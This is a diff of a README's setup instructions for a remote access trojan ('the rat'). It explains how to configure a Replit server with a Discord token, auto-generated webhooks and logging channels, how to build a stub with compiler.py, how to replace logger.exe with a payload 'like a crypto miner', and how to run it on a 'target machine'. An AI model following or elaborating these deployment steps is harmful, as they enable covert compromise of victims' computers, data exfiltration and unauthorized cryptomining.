@@ -44,15 +44,15 @@ Setup can be done pretty quickly!<br>
     
         - This is the same key you will use when building the rat
 
-    - For `t` replace it with your a discord token, so it can dynamically
+    - For `t` replace it with your a discord token, so it can dynamically generate webhooks
 
     - `webhook_generation_logs` is the channel where the log of all webhooks being generated will go and `backup_webhook` is a backup webhook incase it fails to create a webhook
 
- - On the replit on main.py there will be two variables called `channel_id` and `channel_id2` set them to two different discord channel id's so incase one has a ratelimit the log is still sent
+    - The `channel_id` and `channel_id2` are the discord channels where the webhooks will be generated, set them to two different channels in case something happens to the first channel
 
  - Once you've setup your replit, run compiler.py, and either put your config inside config.json and use that or type in your config manually
 
-- Inside your replit replace main.exe with the stub you created with compiler.py, and logger.exe with whatever file you want, like a crypto miner for example
+- Inside your replit replace output.exe with the stub you created with compiler.py, and logger.exe with whatever file you want, like a crypto miner for example
 
  - Then run it on a target machine and it should connect
 
